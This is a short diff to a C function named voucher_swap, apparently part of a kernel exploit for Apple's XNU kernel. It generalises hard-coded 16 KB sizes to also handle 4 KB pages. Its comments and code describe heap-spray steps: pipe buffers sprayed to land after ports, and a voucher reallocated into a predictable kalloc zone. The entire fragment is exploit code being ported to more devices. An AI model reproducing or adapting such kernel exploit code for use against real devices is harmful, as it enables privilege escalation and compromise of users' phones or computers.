@@ -760,7 +760,7 @@ voucher_swap() {
 
 	// 2. Create some pipes so that we can spray pipe buffers later. We'll be limited to 16 MB
 	// of pipe memory, so don't bother creating more.
-	pipe_buffer_size = 16384;
+	pipe_buffer_size = (page_size == 0x4000 ? 16384 : 4096);
 	size_t pipe_count = 16 * MB / pipe_buffer_size;
 	increase_file_limit();
 	int *pipefds_array = create_pipes(&pipe_count);
@@ -786,7 +786,7 @@ voucher_swap() {
 
 	// 4. Spray our pipe buffers. We're hoping that these land contiguously right after the
 	// ports.
-	assert(pipe_buffer_size == 16384);
+	assert(pipe_buffer_size == (page_size == 0x4000 ? 16384 : 4096));
 	pipe_buffer = calloc(1, pipe_buffer_size);
 	assert(pipe_buffer != NULL);
 	assert(pipe_count <= IO_BITS_KOTYPE + 1);
@@ -842,7 +842,7 @@ voucher_swap() {
 	// We will reallocate the voucher to kalloc.32768, which is a convenient size since it lets
 	// us very easily predict what offsets in the allocation correspond to which fields of the
 	// voucher.
-	assert(BLOCK_SIZE(ipc_voucher) == 16384);
+	assert(BLOCK_SIZE(ipc_voucher) == (page_size == 0x4000 ? 16384 : 4096));
 	const size_t ool_port_spray_kalloc_zone = 32768;
 	const size_t ool_port_count = ool_port_spray_kalloc_zone / sizeof(uint64_t);
 	mach_port_t *ool_ports = calloc(ool_port_count, sizeof(mach_port_t));
